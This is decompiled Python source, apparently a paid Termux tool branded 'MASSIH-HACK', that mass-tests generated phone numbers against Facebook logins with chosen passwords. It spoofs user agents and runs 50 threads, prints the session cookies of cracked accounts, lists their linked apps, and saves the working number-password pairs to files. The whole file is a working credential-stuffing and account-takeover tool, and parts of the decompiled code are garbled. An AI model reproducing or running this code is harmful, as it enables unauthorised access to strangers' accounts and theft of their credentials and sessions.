# Source Generated with Decompyle++
# File: test.pyc (Python 3.9)

import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass


logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] SUBSCRIBE MY CHANNEL')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.youtube.com/@Dark_Studio_001')
        FD()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;97m [1] FOLLOW MY FACEBOOK ACCOUNT')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/RayessMassih004?mibextid=ZbWKwL')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
    jalan('\t[ RANDOM NUMBER CRACK ]')
    print('')
    jalan('\x1b[1;97m [1]\x1b[1;32m>>RANDOM CRACK ')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()    
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[!] %s \x1b[1;31m ( Your Active Apps )     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[!] %s \x1b[1;95m ( Your Expired Apps )    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""   
\033[1;97m        .88b  d88.  .d8b.  .d8888. .d8888. d888888b db   db 
\033[1;32m        88'YbdP`88 d8' `8b 88'  YP 88'  YP   `88'   88   88 
\033[1;97m        88  88  88 88ooo88 `8bo.   `8bo.      88    88ooo88 
\033[1;97m        88  88  88 88~~~88   `Y8b.   `Y8b.    88    88~~~88 
\033[1;32m        88  88  88 88   88 db   8D db   8D   .88.   88   88 
\033[1;97m        YP  YP  YP YP   YP `8888Y' `8888Y' Y888888P YP   db
\033[1;37m=======================================================================
\033[1;32m     \033[1;32mAUTHOR\33[1;32m       :  \033[1;32mRayess-Massih
\033[1;32m     \033[1;97mFACEBOK      : \033[1;97m Rayess-Massih
\033[1;32m     \033[1;32mGITHUB       :  \033[1;32mRayess-Massih
\033[1;32m     \033[1;97mTOOL STATUS  :  \033[1;31mpremium
\033[1;32m     \033[1;32mTEAM         :  \033[1;32mDark-Studio
\033[1;32m     \033[1;97mTOOL VIRSION :  \033[1;97m2.4
\033[1;37m=======================================================================
       \33[1;32m\t                              WELLCOME TO MASSIH-HACK TOOL\33[0;m
\033[1;37m=======================================================================\n""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    jalan("\033[1;37m\t( USE OUR COUNTRY CODE )  ")

 
    jalan('\033[1;36m     \t     AFG CODES\n     \033[1;32m9378 , \033[1;32m9379 ,\033[1;32m9377 ,\033[1;32m9374  ...\033[0;97m')
    jalan('\033[1;97m============================================')
    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;32m91778 , \033[1;32m91930 ,\033[1;32m91902 ,\033[1;32m91712  ...\033[0;97m')
    jalan('\033[1;97m============================================')
    jalan('\033[1;36m     \t     BD CODES\n     \033[1;32m88016 , \033[1;32m88017 ,\033[1;32m88018 ,\033[1;32m88019  ...\033[0;97m')
    jalan('\033[1;97m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n \033[1;97mPUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[◇] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[◇] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;32m TOTAL IDS: '+tl)
        print('\033[1;97m THE PROCESS HAS BEEN STARTED')
        print('\033[1;32m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;97m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa-AF;q=0.8,fa;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '1.875',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A125F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;31m[MR-MASSIH-OK] \033[1;32m ' +uid+ ' \033[1;31m[ PAS ] \033[1;32m ' +ps+    '  \033[1;31m\n \033[1;31mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MR-MASSIH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MR-MASSIH-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MR-MASSIH-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s \033[1;97m[\033[1;32mMR-MASSIH\033[1;97m] [\033[1;32m%s/%s\033[1;97m]  \033[1;32mOK:- %s  \033[1;97mCP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
def approval():
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    try:
        httpCaht = requests.get('https://github.com/RayessMassih420/Aprove.txt/blob/main/Aprove.txt').text
        if id in httpCaht:
            print("\33[1;32m YOUR KEY APPROVED")
            msg = str(os.geteuid())
            time.sleep(0.50)
            ud()

            pass
        else:
            print('\33[1;32m {UPDATE EVERY ONE DAY} ')
            print("\33[1;36m───────────────────────────────────────────────────────────────────────")
            print(" {YOUR KEY} : "+id)
            print("\33[1;36m───────────────────────────────────────────────────────────────────────")
            print("\33[1;32m{THE SCRIPT IS PAID NO MESSAGE FOR FREE APPROVE}") 
            print("\33[1;32m{CREAT FILE}                                              {ON}")
            print("\33[1;32m{FILE CLONING}                                            {ON}")
            print("\33[1;32m{RANDOM CLONING API}                                      {ON}")
            print("\33[1;32m{RANDOM CLONING}                                          {ON}")
            print("\33[1;32m{FOLLOW ID CLONING}                                       {ON}")
            print("\33[1;32m{Upgrade to premium}")
            print("\33[1;33m{RATE OF THIS TOOLS}")
            print("\33[1;36m───────────────────────────────────────────────────────────────────────")
            print('{FOR 7 DAYS 100 AFN} ')
            print('{FOR 15 DAYS 200 AFN} ')
            print('{FOR 30 DAYS 400 AFN} ')
            print('{PRESS ENTER} ')
            print("\33[1;36m───────────────────────────────────────────────────────────────────────")
            print ('{IF U DONT WANT TO BUY PLS DONT PRESS ENTER} ')
            input('{IF U WANT TO BUY PRESS ENTER} ')
            tks = ('Hi%20Rayess%20Massih%20!%20Please%20Approve%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+93793772017?text='+tks),approval()
            time.sleep(1)
            approval()
    except Exception as e:
        print(e)
        sys.exit()
approval()

 